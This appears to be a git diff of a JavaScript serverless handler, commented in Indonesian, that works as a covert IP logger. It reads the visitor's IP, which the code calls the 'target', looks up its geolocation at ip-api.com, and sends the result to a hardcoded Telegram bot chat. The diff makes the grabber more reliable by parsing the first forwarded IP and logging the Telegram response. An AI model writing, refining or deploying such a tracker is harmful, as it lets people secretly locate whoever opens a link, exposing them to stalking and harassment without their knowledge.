@@ -5,10 +5,11 @@ export default async function handler(req, res) {
   const CHAT_ID = "7600526426";      // ganti
 
   try {
-    // Ambil IP target dari request
-    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    // Ambil IP target
+    const ipHeader = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    const ip = ipHeader.split(',')[0].trim();
 
-    // Query geolocation dari ip-api.com
+    // Fetch geolocation
     const geoRes = await fetch(`http://ip-api.com/json/${ip}`);
     const data = await geoRes.json();
 
@@ -26,7 +27,7 @@ export default async function handler(req, res) {
     `;
 
     // Kirim ke Telegram
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    const telegramRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
@@ -36,9 +37,13 @@ export default async function handler(req, res) {
       })
     });
 
-    res.status(200).json({ status: "ok" });
+    const telegramResult = await telegramRes.json();
+    console.log("Telegram Result:", telegramResult);  // 🔥 Debug di log
+
+    res.status(200).json({ status: "ok", telegramResult });
 
   } catch (err) {
+    console.error("Error:", err);
     res.status(500).json({ error: err.message });
   }
-}
+                }
